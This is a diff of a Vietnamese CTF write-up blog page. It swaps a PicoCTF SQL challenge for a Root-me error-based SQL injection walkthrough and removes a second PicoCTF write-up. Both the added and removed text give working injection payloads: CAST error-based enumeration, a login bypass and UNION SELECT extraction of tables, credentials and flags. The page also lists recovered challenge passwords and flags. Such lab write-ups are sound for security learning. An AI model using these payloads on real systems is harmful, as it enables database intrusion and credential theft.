@@ -9,7 +9,7 @@
     <meta name="description" content="You think you understand something until you try to teach it">
     <link rel="alternate" type="application/rss+xml" title="DeltA's Blog - Pwned" href="/feed.xml" />
     <!-- Favicon head tag -->
-    <link rel="shortcut icon" type="image/png" href="../../../img/Artboard 1.png" >
+    <link rel="shortcut icon" type="image/png" href="../../img/Artboard 1.png" >
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-137982391-1"></script>
     <script>
       window.dataLayer = window.dataLayer || [];
@@ -29,9 +29,9 @@
       ga('send', 'pageview');
     </script>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
-    <link rel="stylesheet" href="../../../css/bootstrap.min.css" />
-    <link rel="stylesheet" href="../../../css/bootstrap-social.css" />
-    <link rel="stylesheet" href="../../../css/main.css" />
+    <link rel="stylesheet" href="../../css/bootstrap.min.css" />
+    <link rel="stylesheet" href="../../css/bootstrap-social.css" />
+    <link rel="stylesheet" href="../../css/main.css" />
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
     <!-- Facebook OpenGraph tags -->
@@ -73,7 +73,7 @@
               <span class="icon-bar"></span>
               <span class="icon-bar"></span>
             </button>
-            <a class="navbar-brand navbar-brand-logo" href="https://lebathanh1308.github.io/Project_sec1"><img src="../../../img/Artboard 1.png"/></a>   
+            <a class="navbar-brand navbar-brand-logo" href="https://lebathanh1308.github.io/Project_sec1"><img src="../../img/Artboard 1.png"/></a>   
           </div>
           <div class="collapse navbar-collapse" id="main-navbar">
             <ul class="nav navbar-nav navbar-right">
@@ -85,7 +85,7 @@
           <div class="avatar-container">
               <div class="avatar-img-border">
                 <a href="https://lebathanh1308.github.io/Project_sec1">
-                  <img class="avatar-img" src="../../../img/avatar-icon.png" />
+                  <img class="avatar-img" src="../../img/avatar-icon.png" />
                   </a>
               </div>
             </div>
@@ -97,7 +97,7 @@
             <div class="row">
               <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
-                  <h1>PicoCTF: Sql Direct</h1>
+                  <h1>Root me: SQLI - ErrorBased</h1>
                   <span class="post-meta">Posted on March 27, 2024</span>
                 </div>
               </div>
@@ -110,63 +110,37 @@
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <article role="main" class="blog-post">
                     <h2 id="english-below">[WRITE - UP]</h2>     
-                      <p>Hôm nay mình sẽ viết lại challenge này, đây là 1 challenge về SQL.</p>      
-                      <p>Ở challenge này bạn phải connect PostgreSQL Server, ở đây mình sử dụng Kali Linux.</p>
-                      <p><img src="../../../img/sql_direct.png" alt="sql_direct.PNG" /></p> 
-                      <p><a href="https://play.picoctf.org/practice/challenge/303?category=1&page=1&search=sql">Link challenge</a>    
+                        <p><a href="http://challenge01.root-me.org/web-serveur/ch34/?action=login">Link challenge</a>    
+                      <p>Với những challenge như thế này, việc đầu tiên là fuzz ở param nào  xảy ra lỗi, và param order xảy ra lỗi khi mình thử một số kí tự (', #, "...)</p>      
+                      <p><img src="../../img/sqli.png" alt="sqli.PNG" /></p> 
+                      <p>Ngoài ra với position là 1 số hoặc Type CHAR/VARCHAR thì sẽ page phản hồi lỗ</p>
+                      <p>Dựa vào cheatsheet của MySQL, ta có thể sử dụng CAST … AS [type] để khiến database res về error khi postion không thể là VARCHAR/CHAR. Mở burpsuite và thử payload:</p>
         
-                      <p class="box-note">psql -h saturn.picoctf.net -p 55980 -U postgres pico</p>
+                      <p class="box-note">CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS FLOAT)</p>
         
-                      <p>Ta có thể thấy challenge có <strong>\h</strong> với SQL commands, nên mình đã dùng payload sau để lấy tất cả Table ở trong Database</p>
-                      <p class="box-note">SELECT * FROM INFORMATION_SCHEMA.TABLES;</p> 
-                      <p><img src="../../../img/sql_direct2.png" alt="sql_direct2.PNG" /></p>
-        
-                      <p>Có thể thấy kết quả trả về các Table trong Datbase, và có 1 Table <strong>flags</strong></p>    
-                      <p>Lấy flag thui nào!!!</p>
-        
-                      <p class="box-note">SELECT * FROM flags;</p>
-                      <p><img src="../../../img/sql_direct3.png" alt="sql_direct.png" /></p>
-                      <p class="box-note">Flag: picoCTF{L3arN_S0m3_5qL_t0d4Y_31fd14c0}</p>
+                      <p><img src="../../img/sqli1.png" alt="sqli.PNG" /></p>
+                      <p>Response có thể thấy web chỉ hiển thị 1 hàng, ta có thể dùng <strong>LIMIT</strong> để filter về 1 hàng. <strong>Table_name: m3mbr35t4bl3</strong></p>
+                      <p>Tiếp theo lấy <strong>column</strong> thôi!!!</p>
+                      <p class="box-note">CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS FLOAT)</p>
+                      <p><img src="../../img/sqli2.png" alt="sqli.png" /></p>
+                      <p><strong>Column_name: id</strong></p> 
+                      <p>Đến đây, ta cần sử dụng OFFSET để có thể filter vào đúng postion ta cần LIMIT để hiển thị các column còn lại.</p>    
+                      <p class="box-note">CAST((SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET 1) AS FLOAT)</p>
+                      <p><img src="../../img/sqli3.png" alt="sqli.png" /></p>
+                      <p><strong>Username Column: us3rn4m3_c0l</strong></p>
+                      <p class="box-note">CAST((SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET 2) AS FLOAT)</p>
+                      <p><img src="../../img/sqli4.png" alt="sqli.png" /></p>
+                      <p><strong>Password Column: p455w0rd_c0l</strong></p>
+                      <p>Giờ tiến hành lấy Username, password thôi nào, Eazyyyyy!!</p>
+                      <p class="box-note">CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1) AS FLOAT)</p>
+                      <p><img src="../../img/sqli5.png" alt="sqli.png" /></p>
+                      <p class="box-note">CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS FLOAT)</p>
+                      <p><img src="../../img/sqli6.png" alt="sqli.png" /></p>
+                      <p><strong>Username: admin -- Password: 1a2BdKT5DIx3qxQN3UaC</strong></p>
+                      <p class="box-note">Flag: 1a2BdKT5DIx3qxQN3UaC</p>
               </article>
             </div>
         </div>
-    </div>
-    <header class="header-section ">
-      <div class="intro-header no-img">
-        <div class="container">
-          <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-              <div class="post-heading">
-                <h1>PicoCTF: More SQLI</h1>
-                <span class="post-meta">Posted on March 27, 2024</span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </header>
-    <div class="container">
-      <div class="row">
-          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-              <article role="main" class="blog-post">
-                  <h2 id="english-below">[WRITE - UP]</h2>   
-                    <p><a href="https://play.picoctf.org/practice/challenge/358?category=1&page=1&search=sql">Link challenge</a>    
-                    <p>Ở challenge này chúng ta sẽ có 1 form login, và khi nhập <strong>username, password</strong> sẽ trả về chính username, password đó kèm theo 1 Query.</p>
-                    <p><img src="../../../img/more_sqli.png" alt="more_sqli.PNG" /></p> 
-                    <p>Ta có thể thấy có toán tử AND nên buộc cả 2 trường đúng thì mới login thành công, và mình đã test payload vào cả 2 trường <strong>username, password</strong></p>
-      
-                    <p class="box-note">' OR '1'='1--</p>
-                    <p><img src="../../../img/more_sqli1.png" alt="more_sqli.PNG" /></p>     
-                    <p>Ở đây mình thấy 3 cột, và đề bài cũng đề cập SQLI nên mình test payload sau. </p>    
-                    <p class="box-note"> 1,2,3' UNION SELECT name,sql,null FROM sqlite_master--</p>
-                    <p><img src="../../../img/more_sqli2.png" alt="more_sqli.PNG" /></p>     
-                    <p>Mình đã tìm được bảng <strong>more_table</strong> có chứa column <strong>flag</strong></p>
-                    <p class="box-note"> admin' UNION SELECT flag,NULL,NULL from more_table--</p>   
-                    <p><img src="../../../img/more_sqli3.png" alt="more_sqli.png" /></p>
-                    <p class="box-note">Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</p>
-            </article>
-          </div>
-      </div>
     </div>
               <script>
                 if (typeof jQuery == 'undefined') {
